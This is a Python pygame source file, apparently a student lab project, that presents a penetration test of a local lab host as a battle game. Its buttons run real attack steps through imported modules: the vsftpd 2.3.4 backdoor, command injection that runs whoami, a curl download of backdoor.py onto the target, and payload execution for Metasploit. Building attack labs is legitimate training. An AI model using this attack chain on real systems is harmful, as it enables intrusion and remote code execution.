import pygame
import sys
import textwrap
import threading
from comX import check_command_exec
from attack import trigger_payload
from vsftpd_234_exploit import exploit

ip='192.168.1.37'
personal_ip='192.168.1.14'
screen=pygame.display.set_mode((800,500))
pygame.display.set_caption("game")
clock=pygame.time.Clock()
pygame.font.init()
player_images=['player_idle.png','player_attack.png','player_attacked.png','player_dead.png']
puter_images=['puter_idle.png','puter_attack.png','puter_attacked.png','puter_dead.png']
font=pygame.font.Font('Minecraft.ttf', 30)
font2=pygame.font.Font('Minecraft.ttf', 15)
menu_states=[1,2,3,4]
game_active=True
scan_out=["Open Port:80. Protocol:http, Service: Apache V 2.2.8 ","Open Port:21. Protocol:ftp, Service:vsftpd V 2.3.4","Open Port:22. Protocol:SSH, Service:OpenSSH V 4.7p1"]
locks={
    'A':True,
    'E':True,
    'FTP_C':True,
    'FTP_A':True,
    'FTP_E':True,
    'WEB_C':True,
    'WEB_A':True,
    'WEB_E':True
}
clicked={
    'PORT':False,
    'FTP_C':False,
    'FTP_A':False,
    'FTP_E':False,
    'WEB_C':False,
    'WEB_A':False,
    'WEB_E':False,
}

def port_scan():
    global clicked
    locks['FTP_C'],locks['WEB_C']=False,False
    if not clicked['PORT']:
        puter.hp-=10
        clicked['PORT']=True
    player.long=False
    return scan_out
def ftp_check_func():
    locks['FTP_A'],locks['A']=False,False
    if not clicked['FTP_C']:
        puter.hp-=10
        clicked['FTP_C']=True
    player.long=False
    return ['vsftpd v 2.3.4 might contain a backdoor (CVE-2011-2523), Access menu unlocked']

def web_com_exec_check():
    result={1:''}
    locks['WEB_A'],locks['A']=False,False
    if not clicked['WEB_C']:
        puter.hp-=10
        clicked['WEB_C']=True
    player.long=True
    thread=threading.Thread(target=check_command_exec,args=['whoami',result,1])
    thread.start()
    thread.join()
    return textwrap.wrap('App might be vulnerable to command injections. Testing whoami command \n' + result[1])

def ftp_a():
    result={1:''}
    locks['FTP_E'],locks['E']=False,False
    if puter.hp>40:
        puter.hp-=20
    player.long=True
    thread=threading.Thread(target=exploit,args=[ip,21,'whoami',result,1])
    thread.start()
    thread.join()
    return textwrap.wrap(f"Backdoor activated, Testing whoami command {result[1]}",43)
   

def web_a():
    result={1:''}
    if puter.hp>40:
        puter.hp-=20
    locks['WEB_E'],locks['E']=False,False
    player.long=True
    #before running set up a python http.server on port 80 to send payload
    thread=threading.Thread(target=check_command_exec,args=[f'curl http://{ip}:80/backdoor.py -o backdoor.py',result,1])
    thread.start()
    thread.join()
    return ['payload uploaded to target']

def web_e():
    if not clicked['WEB_E']:
        puter.hp-=30
        clicked['WEB_E']=True
    player.long=True
    thread=threading.Thread(target=trigger_payload,daemon=True).start()
    return ['executing payload, check msfconsole']
def ftp_e():
    result={1:''}
    if not clicked['FTP_E']:
        puter.hp-=30
        clicked['FTP_E']=True
    player.long=True
    thread=threading.Thread(target=exploit,args=['192.168.1.37',21,'rm backdoor.py',result,1])
    thread.start()
    thread.join()
    thread=threading.Thread(target=exploit,args=['192.168.1.37',21,'echo This is an echo command, edit in code',result,1])
    thread.start()
    thread.join()
    
    return textwrap.wrap(result[1],30)


class Player(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        self.idx=0
        self.offset=0
        self.long=False
        self.dt=pygame.time.get_ticks()+self.offset
    def anim_attack(self):
        if self.long:
            self.offset=5000
        else:
            self.offset=2000
        self.idx=1
        self.dt=pygame.time.get_ticks()+self.offset
        puter.idx=2
        puter.dt=pygame.time.get_ticks()+self.offset
        
    def update(self):
        if pygame.time.get_ticks()>self.dt and self.idx!=0:
            self.idx=0
            
    def draw(self):
        image=pygame.image.load(player_images[self.idx]).convert_alpha()
        image=pygame.transform.scale_by(image,0.7)
        rect=image.get_rect(center=(250,300))
        screen.blit(image,rect)

class Puter(pygame.sprite.Sprite):
    global game_active
    def __init__(self):
        super().__init__()
        self.hp=100
        self.dt=pygame.time.get_ticks()+3000
        self.idx=0
    def update(self):
        if pygame.time.get_ticks()>self.dt and self.idx!=0:
            self.idx=0
        if self.hp<=0:
            self.idx=3
            game_active=False
    def draw(self):
        self.image=pygame.image.load(puter_images[self.idx]).convert_alpha()
        self.image=pygame.transform.scale_by(self.image,0.7)
        self.rect=self.image.get_rect(center=(550,200))
        screen.blit(self.image,self.rect)
        pygame.draw.rect(screen,'red',(self.rect.centerx,self.rect.centery-100,100,10))
        pygame.draw.rect(screen,'green',(self.rect.centerx,self.rect.centery-100,self.hp,10))

class Button(pygame.sprite.Sprite):
    global text
    def __init__(self,text:str,x:int,y:int,functional: bool,func,state:int,locked,anim_func=None):
            super().__init__()
            self.anim_func=anim_func
            self.text=text
            self.x=x
            self.y=y
            self.state=state
            self.func=func
            self.functional=functional
            self.cursor=pygame.image.load('cursor.png')
            self.cursor=pygame.transform.scale_by(self.cursor,0.05)
            self.cursor_rect=self.cursor.get_rect(midleft=(self.x-20,self.y-5))
            self.locked= locked
            self.image=font.render(self.text,True,'Black')
            self.rect=self.image.get_rect(midleft=(self.x,self.y))
            
            

    def hover(self):
        if self.rect.collidepoint(pygame.mouse.get_pos()):
            screen.blit(self.cursor,self.cursor_rect)
    def action(self):
        if not self.locked:
            if self.functional:
                self.anim_func()
                output_console.text=["Terminal"]
                
                output_console.text=self.func()
            elif not self.functional and self.state!=0:
                menu.buttons=[]
                menu.state=self.state
        

    
    def draw(self):
        if self.locked:
            self.image=font.render(self.text,True,'grey')
        else:
            self.image=font.render(self.text,True,'Black')
        
        self.hover()
        screen.blit(self.image,self.rect)

class Menu(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        self.state= 1
        self.buttons=[]
    def layout(self):
        if self.state==1:
            self.buttons=[]
            recon=Button('RECON',400,400,False,None,2,False)
            access=Button('ACCESS',600,400,False,None,3,locks['A'])
            exploit=Button('EXPLOIT',400,460,False,None,4,locks['E'])
            self.buttons.append(recon)
            self.buttons.append(access)
            self.buttons.append(exploit)
            
        elif self.state==2:
            self.buttons=[]
            Port_Scan=Button('PORT',400,400,True,port_scan,0,False,player.anim_attack)
            Ftp_Anon_check=Button('FTP',600,400,True,ftp_check_func,0,locks['FTP_C'],player.anim_attack)
            Command_exec_check=Button('WEB APP',400,460,True,web_com_exec_check,0,locks['WEB_C'],player.anim_attack)
            back=Button("BACK",600,460,False,None,1,False)
            self.buttons.append(Port_Scan)
            self.buttons.append(Command_exec_check)
            self.buttons.append(Ftp_Anon_check)
            self.buttons.append(back)
        elif self.state==3:
            self.buttons=[]
            Web=Button('WEB APP',400,400,True,web_a,0,locks['WEB_A'],player.anim_attack)
            FTP=Button('FTP',600,400,True,ftp_a,0,locks['FTP_A'],player.anim_attack)
            back=Button("BACK",400,460,False,None,1,False)
            self.buttons.append(Web)
            self.buttons.append(FTP)
            self.buttons.append(back)
        elif self.state==4:
            self.buttons=[]
            Web_exploit=Button('WEB APP',400,400,True,web_e,0,locks['WEB_E'],player.anim_attack)
            Ftp_exploit=Button('FTP',600,400,True,ftp_e,0,locks['FTP_E'],player.anim_attack)
            back=Button("BACK",400,460,False,None,1,False)
            self.buttons.append(Web_exploit)
            self.buttons.append(Ftp_exploit)
            self.buttons.append(back)
        
    def draw(self):
        self.layout()
        pygame.draw.rect(screen,'black',(360,360,400,400),10,5)
        for button in self.buttons:
            button.draw()

class Console(pygame.sprite.Sprite):
    def __init__(self):
        global text_img,text_rect
        super().__init__()
        self.text=["Console"]
        
    def draw(self):
        image=pygame.Surface((len(self.text[0])*10,len(self.text)*25))
        image.fill('black')
        rect=image.get_rect(topleft=(0,0))
        screen.blit(image,rect)
    def draw_text(self):
        for i in range(len(self.text)):
            text_img=font2.render(self.text[i],False,'white')
            text_rect=text_img.get_rect(topleft=(10,10+i*20))
            screen.blit(text_img,text_rect)

player=Player()
menu=Menu()
puter=Puter()
output_console=Console()
while game_active:
    for event in pygame.event.get():
        if event.type==pygame.WINDOWCLOSE:
            pygame.quit()
            sys.exit()
        for button in menu.buttons:
            if event.type==pygame.MOUSEBUTTONDOWN and button.rect.collidepoint(pygame.mouse.get_pos()):
                button.action()
                
                
                
    screen.fill('white')
    player.draw()
    player.update()
    menu.draw()
    puter.draw()
    puter.update()
    output_console.draw()
    output_console.draw_text()
    pygame.display.update()
    clock.tick(60)